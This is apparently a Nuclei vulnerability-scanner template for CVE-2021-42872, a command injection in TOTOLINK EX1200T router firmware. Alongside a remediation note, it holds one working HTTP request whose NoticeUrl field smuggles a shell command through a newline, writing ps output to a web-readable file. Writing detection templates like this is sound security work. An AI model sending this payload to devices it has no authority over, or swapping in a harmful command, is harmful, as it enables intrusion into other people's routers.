id: CVE-2021-42872

info:
  name: TOTOLINK EX1200T Command Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    TOTOLINK EX1200T V4.1.2cu.5215 is affected by a command injection vulnerability that can remotely execute arbitrary code.
  remediation: |
    To remediate the command injection vulnerability in TOTOLINK EX1200T, update the firmware to the latest version available from the manufacturer. Ensure that all security patches are applied promptly. Additionally, restrict access to the device management interface to trusted networks only, and regularly audit device configurations and logs for unauthorized changes or access attempts.
  reference:
    - https://github.com/p1Kk/vuln/blob/main/totolink_ex1200t_NoticeUrl_rce4.md

http:
  - method: POST
    path:
      - "/cgi-bin/cstecgi.cgi?action=1"

    headers:
      Content-Type: "application/json"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
      Accept-Encoding: "gzip, deflate"
      Accept-Language: "zh-CN,zh;q=0.9,zh-TW;q=0.8"
      Connection: "close"

    body: |
      {
        "topicurl": "setNoticeCfg",
        "NoticeEnabled": "1",
        "NoticeUrl": "1.1.1.1\nps>/web_cste/test1\necho",
        "BtnName": "Click here to continue",
        "NoticeTimeoutVal": "120"
      }

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "test1"
        part: body

      - type: status
        status:
          - 200
